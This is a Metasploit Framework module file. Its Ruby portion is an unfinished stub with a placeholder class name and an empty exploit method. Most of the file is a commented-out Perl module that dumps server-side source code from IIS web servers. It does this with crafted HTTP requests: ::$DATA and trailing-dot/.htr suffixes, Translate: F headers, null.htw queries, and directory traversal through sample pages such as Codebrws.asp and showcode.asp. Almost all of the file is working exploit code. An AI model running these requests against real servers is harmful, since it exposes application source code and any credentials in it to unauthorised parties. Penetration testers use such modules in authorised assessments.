require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IIS Web Application Source Code Disclosure',
			'Description'    => %q{
				This module will use a variety of techniques to dump the
				source code of a remote web application.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'MIL', '31'],

				],
			'Privileged'     => true,
			
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::iis_source_dumper;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
  {
	'Name'     => 'IIS Web Application Source Code Disclosure',
	'Version'  => '$Revision$',
	'Authors'  => [ 'H D Moore <hdm [at] metasploit.com>' ],

	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'RFILE' => [1, 'DATA', 'The remote file path', '/default.asp'],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'SSL'   => [1, 'BOOL', 'The target port', 0],
		'FORCE'	=> [0, 'BOOL', 'Force testing when sanity check fails'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module will use a variety of techniques to dump the source code
		of a remote web application.
}),

	'Refs' =>
	  [
		['MIL', '31']
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		[ 'All Techniques'							],
		[ 'Truncated HTR',	\&bug_truncatehtr		],
		[ 'NTFS ::$DATA',	\&bug_ntfsdata			],
		[ 'Translate: F',	\&bug_translatef		],
		[ 'Null HTW',		\&bug_nullhtw			],
		[ 'Codebrws.asp',	\&bug_codebrws			],
		[ 'Sample HTW',		\&bug_nullhtw			],
		[ 'Dot Plus HTR',	\&bug_plusdothtr		],
		[ 'MSADC Showcode',	\&bug_msadcshowcode		],
		[ 'IIS 4 Showcode',	\&bug_iis4viewcode		],

	  ],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $resp = $self->Exploit('check');
	return $self->CheckCode('Confirmed') if $resp;
	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self = shift;
	my $mode = shift;
	my $found = 0;

	if (! $self->Sanity && ! $self->GetVar('FORCE')) {
		$self->PrintLine("[*] Use the 'FORCE' option to continue anyways");
		return;
	}

	my @techs;

	# Determine which techniques should be used to get the file
	if ($self->GetVar('TARGET') == 0) {
		for (my $x = 1; $self->Targets->[$x]; $x++) {
			push @techs, $self->Targets->[$x]
		}
	}
	else {
		@techs = ( $self->Targets->[$self->GetVar('TARGET')] );
	}

	# Iterate through the selected tests
	foreach my $tech_ref (@techs) {
		my ($tech_name, $tech_func) = @{ $tech_ref };

		$self->PrintLine("[*] Attempting to use the '$tech_name' technique...");
		my $res = $tech_func->($self);

		if ($res) {
			$self->PrintLine("[*] Source code obtained via technique $tech_name");
			if ($mode eq 'check') {
				$found++;
			}
			else {
				$self->Print($res);
				return;
			}
		}
	}

	if ($found && $mode eq 'check') {
		return $found;
	}

	$self->PrintLine("[*] All implemented techniques have failed");
	return;
}

sub Sanity {
	my $self = shift;
	my $sock = $self->Connect;

	return if ! $sock;

	my $req =
	  "GET ".$self->GetVar('RFILE'). " HTTP/1.1\r\n".
	  "Host: ". $self->VHost. "\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "\r\n";

	$sock->Send($req);

	my $code = $sock->RecvLine(5);
	my $data = $sock->Recv(-1, 5);

	$sock->Close;

	$self->SetTempEnv('RealData', $data);

	if ($code !~ /^HTTP....\s+(200|40[123]|50.)/) {
		$code =~ s/\r|\n//g;
		$self->PrintLine("[*] Sanity check failed: $code");
		return;
	}

	return 1;
}

sub DetectSource {
	my $self = shift;
	my $data = shift;
	my $real = $self->GetTempEnv('RealData');

	return 1 if $data =~ m/\<\%/;
	return 1 if $data =~ m/\<\?/;

	return 1 if ! $real;
	return if $data =~ /content-length: 0/i;

	# Not really accurate, but its quick and easy
	# my $sampleA = substr($data, -32, 32);
	# my $sampleB = substr($real, -32, 32);

	return;
}

##
# Source Dumper Techniques
##

sub bug_ntfsdata {
	my $self = shift;
	my $sock = $self->Connect;
	return if ! $sock;

	my $req =
	  "GET ".$self->GetVar('RFILE'). "::\$DATA HTTP/1.1\r\n".
	  "Host: ". $self->VHost. "\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "\r\n";

	$sock->Send($req);

	my $data = $sock->Recv(-1, 5);
	$sock->Close;

	return if $data =~ /^HTTP....\s+[345]/;
	return $data if $self->DetectSource($data);
	return;
}

sub bug_translatef {
	my $self = shift;
	my $sock = $self->Connect;
	return if ! $sock;

	my $req =
	  "GET ".$self->GetVar('RFILE'). "\\ HTTP/1.1\r\n".
	  "Translate: F\r\n".
	  "Host: ". $self->VHost. "\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "\r\n";

	$sock->Send($req);

	my $data = $sock->Recv(-1, 5);
	$sock->Close;

	return if $data =~ /^HTTP....\s+[345]/;
	return $data if $self->DetectSource($data);
	return;
}

# This technique will only work if the file extension ends in
# .asp, .htm, .html, or .inc (or any of these extensions plus
# a single character, such as .aspx or .htmx. We assume the
# web root is parallel to the iissamples directory.
sub bug_codebrws {
	my $self = shift;

	for my $level (1 .. 4) {
	
		my $sock = $self->Connect;
		return if ! $sock;
		
		my $path =
		  '/iissamples/sdk/asp/docs/CodeBrws.asp?Source='.
		  '/iissamples/'. ('%c0%ae%c0%ae/' x $level) .'wwwroot'.
		  $self->GetVar('RFILE');

		my $req =
		  "GET $path HTTP/1.1\r\n".
		  "Host: ". $self->VHost. "\r\n".
		  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
		  "\r\n";

		$sock->Send($req);

		my $data = $sock->Recv(-1, 5);
		$sock->Close;

		next if $data =~ /^HTTP....\s+[345]/;
		next if $data =~ /View Active Server Page Source.. Access Denied/;
		next if $data !~ /HTML and Text/;

		$self->PrintLine("[*] $path");
		my $start = '<FONT FACE="VERDANA, ARIAL, HELVETICA" SIZE="2">';
		my $idx = rindex($data, $start);
		if ($idx != -1) {
			$data = substr($data, $idx + length($start));
			$data = $self->Uglify($data);
		}

		return $data;
	}
	
	return;
}

# This bug returns file *fragments*, so detection may not always work
sub bug_plusdothtr {
	my $self = shift;
	my $sock = $self->Connect;
	return if ! $sock;

	my $req =
	  "GET ".$self->GetVar('RFILE'). "+.htr HTTP/1.1\r\n".
	  "Host: ". $self->VHost. "\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "\r\n";

	$sock->Send($req);

	my $data = $sock->Recv(-1, 5);
	$sock->Close;

	return if $data =~ /^HTTP....\s+[345]/;
	return $data if $self->DetectSource($data);
	return;
}

# This can be used to view any file on the same partition actually, so
# we have to assume the web root is in the default location.
sub bug_msadcshowcode {
	my $self = shift;
	my $sock = $self->Connect;
	return if ! $sock;

	my $path =
	  '/msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Samples/'.
	  '/../../../../../inetpub/wwwroot'.
	  $self->GetVar('RFILE');

	my $req =
	  "GET $path HTTP/1.1\r\n".
	  "Host: ". $self->VHost. "\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "\r\n";

	$sock->Send($req);

	my $data = $sock->Recv(-1, 5);
	$sock->Close;

	return if $data =~ /^HTTP....\s+[345]/;
	return if $data =~ /View Active Server Page Source.. Access Denied/;

	if ($data =~ /HTML and Text/ && $data !~ /Microsoft VBScript runtime/) {
		$data = $self->Uglify($data);
		$self->PrintLine("[*] $path");
		return $data;
	}

	return;
}

# This can be used to view any file on the same partition actually, so
# we have to assume the web root is in the default location.
sub bug_iis4viewcode {
	my $self = shift;
	my @paths =
	  (
		'/iissamples/Exair/Howitworks/Codebrws.asp',
		'/iissamples/Exair/Howitworks/Code.asp',
		'/iissamples/Exair/Howitworks/Codebrw1.asp',
		'/iissamples/sdk/asp/docs/codebrws.asp',
		'/iissamples/sdk/asp/docs/codebrw2.asp',
		'/Sites/Knowledge/Membership/Inspired/ViewCode.asp',
		'/Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp',
		'/Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp',
		'/Sites/Samples/Knowledge/Membership/Inspiredtutorial/ViewCode.asp',
		'/Sites/Samples/Knowledge/Push/ViewCode.asp',
		'/Sites/Samples/Knowledge/Search/ViewCode.asp',
		'/SiteServer/Publishing/viewcode.asp',
	  );

	foreach my $sample (@paths) {
		my $sock = $self->Connect;
		return if ! $sock;

		my $path =
		  $sample.'?source=/../../../../../../inetpub/wwwroot'.
		  $self->GetVar('RFILE');

		my $req =
		  "GET $path HTTP/1.1\r\n".
		  "Host: ". $self->VHost. "\r\n".
		  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
		  "\r\n";

		$sock->Send($req);

		my $data = $sock->Recv(-1, 5);
		$sock->Close;

		next if $data =~ /^HTTP....\s+[345]/;
		return if $data =~ /View Active Server Page Source.. Access Denied/;

		if ($data =~ /HTML and Text/ && $data !~ /Microsoft VBScript runtime/) {
			$data = $self->Uglify($data);
			$self->PrintLine("[*] $path");
			return $data;
		}

	}

	return;
}

sub bug_nullhtw {
	my $self = shift;
	my $sock = $self->Connect;
	return if ! $sock;

	my $path =
	  '/null.htw?CiWebhitsfile='.$self->GetVar('RFILE').
	  '%20&CiRestriction=none&CiHiliteType=Full';

	my $req =
	  "GET $path HTTP/1.1\r\n".
	  "Host: ". $self->VHost. "\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "\r\n";

	$sock->Send($req);

	my $data = $sock->Recv(-1, 5);
	$sock->Close;

	return if $data =~ /^HTTP....\s+[345]/;
	if ($data =~ /takes you to the next hit/) {
		$data = $self->Uglify($data);
		return $data;
	}
	return;
}

# This can be used to view any file on the same partition actually, so
# we have to assume the web root is in the default location.
sub bug_samplehtw {
	my $self = shift;

	my @paths =
	  (
		'/iissamples/issamples/oop/qfullhit.htw',
		'/iissamples/issamples/oop/qsumrhit.htw',
		'/isssamples/exair/search/qfullhit.htw',
		'/isssamples/exair/search/qsumrhit.htw',
		'/isshelp/iss/misc/iirturnh.htw',
	  );

	foreach my $sample (@paths) {
		my $sock = $self->Connect;
		return if ! $sock;

		my $path =
		  $sample.'?CiWebhitsfile=../../../../inetpub/wwwroot'.$self->GetVar('RFILE').
		  '&CiRestriction=none&CiHiliteType=Full';

		my $req =
		  "GET $path HTTP/1.1\r\n".
		  "Host: ". $self->VHost. "\r\n".
		  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
		  "\r\n";

		$sock->Send($req);

		my $data = $sock->Recv(-1, 5);
		$sock->Close;

		next if $data =~ /^HTTP....\s+[345]/;

		if ($data =~ /takes you to the next hit/) {
			$self->PrintLine("[*] $path");
			$data = $self->Uglify($data);
			return $data;
		}
	}

	return;
}

# This check has to run first, since it will only work the first
# time ISM.dll is loaded into the inetinfo process.
sub bug_truncatehtr {
	my $self = shift;
	my $sock = $self->Connect;
	return if ! $sock;

	my $path =
	  $self->GetVar('RFILE'). ('%20' x 230). '.htr';

	my $req =
	  "GET $path HTTP/1.1\r\n".
	  "Host: ". $self->VHost. "\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "\r\n";

	$sock->Send($req);

	my $data = $sock->Recv(-1, 5);
	$sock->Close;

	return if $data =~ /^HTTP....\s+[345]/;
	return 1 if $self->DetectSource($data);
	return;
}

##
# General Purpose
##

sub Uglify {
	my $self = shift;
	my $data = shift;
	$data =~ s/\<br\>/\n/gi;
	$data =~ s/\<[^\>+]\>//smg;
	$data =~ s/\&nbsp;/ /g;
	$data =~ s/\&lt;/\</g;
	$data =~ s/\&gt;/\>/g;
	$data =~ s/\&quot;/\"/g;
	return $data;
}

sub VHost {
	my $self = shift;
	my $name = $self->GetVar('VHOST') || $self->GetVar('RHOST');
	return $name;
}

sub Connect {
	my $self = shift;
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $self->GetVar('RHOST'),
		'PeerPort'  => $self->GetVar('RPORT'),
		'SSL'		=> $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	return $s;
}

1;


=end


end
end	
